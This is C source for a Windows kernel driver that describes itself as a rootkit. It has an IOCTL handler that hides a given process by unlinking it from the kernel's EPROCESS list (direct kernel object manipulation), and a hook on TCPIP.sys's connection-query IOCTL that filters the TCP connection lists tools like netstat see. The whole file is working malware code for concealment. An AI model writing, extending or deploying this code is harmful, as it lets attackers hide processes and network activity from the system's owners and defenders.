#include "driver.h"
#include "tcphook.h"

// IRP code that will call our EPROCESS de-link functionality
#define IRP_ROOTKIT_CODE 0x815

// IoControl Code we want to filter in TCPIP.sys
// When a program such as netstat.exe requests a list of ports/programs
// it uses the major IRP control code IOCTL_TCP_QUERY_INFORMATION_EX
#define IOCTL_TCP_QUERY_INFORMATION_EX 0x00120003

// Default IRP dispatcher, passthrough no action, return STATUS_SUCCESS
NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage) {

	UNREFERENCED_PARAMETER(DeviceObject);

	// Set status as success
	IrpMessage->IoStatus.Status = STATUS_SUCCESS;
	IrpMessage->IoStatus.Information = 0;

	// Complete request
	IoCompleteRequest(IrpMessage, IO_NO_INCREMENT);

	return(STATUS_SUCCESS);
}

// Handler to recieve IRP request and call Rootkit functionality
NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {

	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION  irpSp;
	ULONG               inBufferLength, outBufferLength, requestcode;
	

	// Recieve the IRP stack location from system
	irpSp = IoGetCurrentIrpStackLocation(Irp);

	// Recieve the buffer lengths, and request code
	inBufferLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	requestcode = irpSp->Parameters.DeviceIoControl.IoControlCode;

	// Check the request code
	switch (requestcode) {

	case IRP_ROOTKIT_CODE:
	{
		PCHAR				inBuf;
		inBuf = Irp->AssociatedIrp.SystemBuffer;
		Irp->IoStatus.Information = inBufferLength;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "DKOM: incoming IRP : %s", inBuf));

		// Allocate memory for the PID
		char pid[10];

		// Copy the input buffer into PID
		strcpy_s(pid, inBufferLength, inBuf);

		/* Lock access to EPROCESS list using the IRQL (Interrupt Request Level) approach
		KIRQL irql;
		PKDPC dpcPtr;
		irql = RaiseIRQL();
		dpcPtr = AquireLock();  */

		// Call our rootkit functionality
		// modifyTaskList in hideprocess.c
		modifyTaskList(atoi(pid));

		/* Release access to the EPROCESS list and exit
		ReleaseLock(dpcPtr);
		LowerIRQL(irql); */

		break;
	}
	
	// IOCTL_TCP_QUERY_INFORMATION_EX is discussed in hook.h
	case IOCTL_TCP_QUERY_INFORMATION_EX:
	{
		TDIObjectID			*inBuf;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "DKOM: incoming IRP : %s", requestcode));

		/*
		The IOCTL_TCP_QUERY_INFORMATION_EX IOCTL indicated that the transfer type is 003:
		https://msdn.microsoft.com/en-us/library/windows/hardware/ff543023(v=vs.85).aspx

		MSDN defines the following transfer types:

		#define METHOD_BUFFERED                 0
		#define METHOD_IN_DIRECT                1
		#define METHOD_OUT_DIRECT               2
		#define METHOD_NEITHER                  3

		METHOD_NEITHER

		https://msdn.microsoft.com/en-us/library/windows/hardware/ff540663(v=vs.85).aspx

		The I/O manager does not provide any system buffers or MDLs. The IRP supplies the user-mode virtual
		addresses of the input and output buffers that were specified to DeviceIoControl or IoBuildDeviceIoControlRequest,
		without validating or mapping them. The input buffer's address is supplied by Parameters.DeviceIoControl.Type3InputBuffer
		in the driver's IO_STACK_LOCATION structure, and the output buffer's address is specified by Irp->UserBuffer.
		Buffer sizes are supplied by Parameters.DeviceIoControl.InputBufferLength and Parameters.DeviceIoControl.OutputBufferLength
		in the driver's IO_STACK_LOCATION structure.
		*/

		inBuf = (TDIObjectID *)irpSp->Parameters.DeviceIoControl.Type3InputBuffer;

		// CO_TL_ENTITY is for TCP and CL_TL_ENTITY is for UDP, only filtering TCP connections
		if (inBuf->toi_entity.tei_entity == CO_TL_ENTITY)
		{
			// Ensure the toi_id is one of the supported values we've defined structures for
			if ((inBuf->toi_id == 0x101) || (inBuf->toi_id == 0x102) || (inBuf->toi_id == 0x110))
			{
				// Call our completion routine if IRP successful
				irpSp->Control = 0;
				irpSp->Control |= SL_INVOKE_ON_SUCCESS;

				// Save old completion routine if present
				irpSp->Context =  ExAllocatePool(NonPagedPool, sizeof(REQINFO));

				((PREQINFO)irpSp->Context)->OldCompletion = irpSp->CompletionRoutine;
				((PREQINFO)irpSp->Context)->ReqType = inBuf->toi_id;

				// Setup our function to be called on completion of IRP
				// we will filter the response in the completion routine
				irpSp->CompletionRoutine = (PIO_COMPLETION_ROUTINE)HookCompletionRoutine;
			}
		}

		// Now return the I/O request to the old proper handler
		return OldIrpMjDeviceControl(DeviceObject, Irp);

	} 
	default:
	{
		// Set invalid request
		status = STATUS_INVALID_DEVICE_REQUEST;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "DKOM Error : STATUS_INVALID_DEVICE_REQUEST\n"));
		break;
	}
	}

	PIRP IrpResponse = Irp;

	// Set status 
	IrpResponse->IoStatus.Status = status;

	// Complete request
	IoCompleteRequest(IrpResponse, IO_NO_INCREMENT);

	return status;
}